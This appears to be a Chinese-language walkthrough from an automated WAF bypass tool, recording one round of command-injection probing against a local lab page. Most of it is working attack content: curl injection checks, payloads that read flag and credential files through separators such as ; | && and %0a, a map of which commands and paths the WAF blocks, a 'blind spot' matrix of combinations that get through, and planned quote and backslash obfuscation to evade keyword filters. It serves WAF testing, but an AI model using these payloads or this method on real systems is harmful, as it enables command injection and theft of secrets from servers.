# CMDi 完整一轮示例

以下是 Skill 执行 `/semantic-mining cmdi --rounds 5` 第一轮的完整实录。

---

## 第 0 步：冷启动

`logs/skill_state.json` 不存在 → 创建初始骨架：

```json
{
  "scenario": "cmdi",
  "attack_surface_type": "unknown",
  "round": 0,
  "rounds_max": 5,
  "waf_url": "http://localhost:8090",
  "started_at": "2026-07-31T10:00:00",
  "updated_at": "2026-07-31T10:00:00",
  "status": "running",
  "profile": "samples/targets/profile.json",
  "attention_map": {},
  "explored_categories": {},
  "confirmed_blindspots": [],
  "waf_effective": [],
  "next_direction": null,
  "termination_reason": null
}
```

---

## 第 1 步：黑盒侦察

### 1.1 读页面 HTML

```bash
curl -s "http://localhost:8090/cmdi/level1.php"
```

从 HTML 提取：
- **参数名**：`cmd`（`<input name="cmd">`）
- **攻击目标**：`flag{backup_admin_token_4a7c}` 在 `/srv/data/db.json`，`flag{ssh_deploy_passphrase_7f4a}` 在 `/srv/data/server_config.yml`
- **请求方法**：GET

### 1.2 确认注入点

```bash
curl -s -G --data-urlencode "cmd=;echo INJECTION_OK" \
  "http://localhost:8090/cmdi/level1.php" -w '\n%{http_code}'
# 响应体含 "INJECTION_OK"，HTTP 200 → 命令注入确认
```

### 1.3 建立基线

```bash
# 定位输出区域
curl -s -G --data-urlencode "cmd=;echo OUTPUT_MARKER_7x9q2" \
  "http://localhost:8090/cmdi/level1.php"
# → <pre>OUTPUT_MARKER_7x9q2</pre> → 输出区域 = <pre> 标签

# 保存基线
curl -s -G --data-urlencode "cmd=127.0.0.1" \
  "http://localhost:8090/cmdi/level1.php" > /tmp/baseline_cmdi.txt
# 基线中无 flag → 后续判定排除模板干扰
```

### 1.4 WAF OFF 基线

无直连端口 → 记录："无 OFF 基线，判定置信度降低一级。"

### 1.5 判定结果

- `attack_surface_type`: `orthogonal` (Type A)
- 参数: `cmd`, 输出区域: `<pre>`, 两个 flag 目标路径

---

## 第 2 步：边界展开 (Type A)

### 锚点探测

```
payload: ;cat /srv/data/db.json
→ HTTP 200, flag{backup_admin_token_4a7c} 出现在 <pre> 中
→ 锚点有效！基础组合安全。
```

记录：`probe_log.jsonl`
```jsonl
{"round":1,"step":2,"category":"anchor","dimension":"combined","variant":"baseline","payload":";cat /srv/data/db.json","http_status":200,"flag_hit":true,"waf_attention":"low","classification":"data_extraction","timestamp":"2026-07-31T10:02:15"}
```

### 维度 1：分隔符（三角定位归因后展开）

**三角定位 — 验证 `;` 语法**：
```
探针A: ;cat /srv/data/db.json → 200 ✅
探针B: ;cat /srv/data/server_config.yml → 200 ✅
→ 两个不同路径都通过 → ; 语法干净 → 展开分隔符维度
```

**展开分隔符**：
```
|cat /srv/data/db.json → 200, flag ✅ → | = low
||cat /srv/data/db.json → 200, flag ✅ → || = low
&&cat /srv/data/db.json → 200, flag ✅ → && = low
%0acat /srv/data/db.json → 200, flag ✅ → %0a = low
```

**三角定位 — 验证 `$()` 语法**：
```
探针A: $(cat /srv/data/db.json) → 403 ❌
探针B: $(cat /srv/data/server_config.yml) → 403 ❌
→ 两个不同目标都被拦 → 拦的是 $() 语法 → 跳过 $() 全矩阵
```

继续：`` ` `` → 403, 403（第二个路径）→ 边界确认。`${IFS}` → 403, 403 → 边界确认。

分隔符维度结果：`; | || && %0a` = low; `$()` `` ` `` `${IFS}` = high（边界确认）。

### 维度 2：命令（锚定 `;` + `/srv/data/db.json`）

```
;dd if=/srv/data/db.json 2>/dev/null → 200, flag ✅ → dd = low
;tee /dev/stderr </srv/data/db.json 2>/dev/null → 200, flag ✅ → tee = low
;cut -c1-100 /srv/data/db.json → 200, flag ✅ → cut = low
;sort /srv/data/db.json → 200, flag ✅ → sort = low
;tr 'a-z' 'A-Z' </srv/data/db.json → 200, flag ✅ → tr = low

;whoami → 403 ❌
;whoami → 403 ❌（再次确认）
→ 边界确认。whoami = high

;base64 /srv/data/db.json → 403 ❌
;base64 /srv/app/config/database.cnf → 403 ❌（三角定位：两个不同路径都被拦）
→ 边界确认。base64 = high
```

命令维度结果：`cat dd tee cut sort tr file awk sed head tail fold hexdump` = low; `whoami base64` = high。

### 维度 3：路径（锚定 `;cat`）

```
;cat /usr/share/dict/words → 200, 部分内容 ✅ → /usr/share/* = low
;cat /srv/app/config/database.cnf → 200, flag ✅ → /srv/app/* = low

;cat /etc/motd → 403 ❌
;cat /etc/hostname → 403 ❌
→ 边界确认。/etc/* = high

;cat /var/log/syslog → 403, 403 → /var/* = high
;cat /tmp/test → 403, 403 → /tmp/* = high
;cat /proc/version → 403, 403 → /proc/* = high
;cat /opt/test → 200 → /opt/* = low（不在任何黑名单！）
;cat /home/user/test → 403, 403 → /home/* = high
```

路径维度结果：`/srv/* /usr/share/* /opt/*` = low; `/etc/* /var/* /tmp/* /proc/* /home/*` = high。

### 本轮注意力地图（写入 skill_state.json）

```json
"attention_map": {
  "separators": {";": "low", "|": "low", "||": "low", "&&": "low", "%0a": "low", "$()": "high", "`": "high", "${IFS}": "high"},
  "commands": {"cat": "low", "dd": "low", "tee": "low", "cut": "low", "sort": "low", "tr": "low", "whoami": "high", "base64": "high"},
  "paths": {"/srv/*": "low", "/usr/share/*": "low", "/opt/*": "low", "/etc/*": "high", "/var/*": "high", "/tmp/*": "high", "/proc/*": "high", "/home/*": "high"}
}
```

---

## 第 3 步：突破确认 + 四维评估

### 3.1 盲区立方体

```
分隔符: ; | || && → 4 个 low
命令:   cat dd tee cut sort tr → 6 个 low
路径:   /srv/* /usr/share/* /opt/* → 3 个 low
→ 盲区立方体: 4 × 6 × 3 = 72 个理论组合
```

### 交叉验证（随机取 4 个未测组合）

```
;sort /usr/share/dict/words → 200 ✅
&&cut /srv/app/config/database.cnf → 200, flag ✅
|tr 'a-z' 'A-Z' </opt/test → 200 ✅
%0add if=/srv/data/server_config.yml 2>/dev/null → 200, flag ✅
```

全部 4 个新组合通过 → 盲区立方体确认，置信度 high。

### 3.2 四维评估（以 `;dd if=/srv/data/db.json` 为例）

| 维度 | 评分 | 理由 |
|------|:--:|------|
| 有效性 | **S** | flag 完整出现在输出区域，数据提取成功 |
| 危害性 | **L4** | 读取了 `/srv/data/db.json` 中的凭证级 flag |
| 洞察性 | **A** | 揭示了 WAF 基于黑名单（932160）检测命令，dd 不在黑名单中——可泛化到其他 12+ 个文件读取命令 |
| 可用性 | **S** | payload 仅 35 字符，无版本/配置依赖，语法干净 |

综合：S + L4 + A + S → ✅ 高质量样本 → 写入 `samples/batches/cmdi_r1_20260731_100000.jsonl`

### 产出

- **高质量样本**：~15 条（3 个维度交叉产生的代表性 payload）→ 写入 batch
- **边界标记**：`$()` `` ` `` `${IFS}` `whoami` `base64` `/etc/*` `/var/*` 等 → 写入 `probe_log.jsonl` 和 `waf_effective`
- **确认盲区**：1 个立方体（72 组合）→ 写入 `confirmed_blindspots`

---

## 第 4 步：自主决策

```json
"next_direction": {
  "action": "lateral_explore",
  "category": "quote_splitting",
  "reason": "分隔符、命令、路径三个维度的边界已画清。横向探索 token 混淆——shell 的引号移除机制 vs WAF 的字符串匹配",
  "hypothesis": "c'a't 模式应能绕过 WAF 的 cat 关键字检测。扩展到其他被拦命令（whoami → wh'o'am'i）可能也有效。反斜杠混淆 \c\a\t 同理。"
}
```

→ 进入第 2 轮，探索 token 混淆维度。

---

## 本轮的 curl 请求统计

| 类别 | 数量 |
|------|------|
| 第 1 步侦察 | 5 |
| 第 2 步三角定位 | 8（4 对探针） |
| 第 2 步分隔符展开 | 8 |
| 第 2 步命令展开 | 12 |
| 第 2 步路径展开 | 16 |
| 第 3 步交叉验证 | 4 |
| **合计** | **53** |

> 对比：如果不用三角定位跳过 `$()` `` ` `` `${IFS}` 三个被拦语法，每个语法展开时会产生 ~20 次额外请求（分隔符 + 命令 + 路径的全组合），总计浪费 ~60 次请求。三角定位在本轮中节省了 50%+ 探测量。
